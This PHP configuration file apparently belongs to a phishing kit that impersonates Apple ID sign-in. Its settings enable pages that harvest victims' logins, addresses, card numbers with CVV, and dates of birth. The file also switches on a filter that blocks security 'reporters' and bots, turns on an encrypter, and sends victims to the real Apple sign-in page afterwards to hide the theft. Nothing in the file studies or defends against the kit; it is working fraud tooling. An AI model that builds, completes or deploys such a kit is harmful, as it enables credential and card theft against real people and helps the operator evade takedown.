<?php


//////////////////////////////////////////////////////////////////
// enable: 1
// disable: 0

/////////////////////////
//		GLOBAL	      ///
/////////////////////////

// disable or enable visitors filter, keep it enabled to block known reporters networks & bots.
// check visitors: hostname, ip, isp, referer, useragent.
// to edit blocked list check blocked.php file
$enable_blocker = 1;

$enable_encrypter = 1;

$default_language = 'es';

// Dynamically dispaly language based on user browser language. If disabled, default language will be used.
$dynamic_language = 1;

$use_icloud_login_page = 0;


 //disable profile.php
$disable_address_page = 0;

//disable login page auth.php
$disable_login_page = 0;

//disable bank info page exception.php
$disable_bank_info_page = 0;

// If disabled processing page and confirmation page then user will be redirected to url in $final_redirect_url
// disable or enable processing.php
$disable_processing_page = 0;

// disable or enable success.php
$disable_confirmation_page = 0;

// URL to redirect after user finish 
$final_redirect_url = 'https://appleid.apple.com/#!&page=signin';
#$final_redirect_url = 'http://localhost';



/////////////////////////////////////
//		Bank/Card Info Page		   //
//			exception.php		  ///	
/////////////////////////////////////

$request_for_cvv = 1;

$request_for_date_of_birth = 1;


?>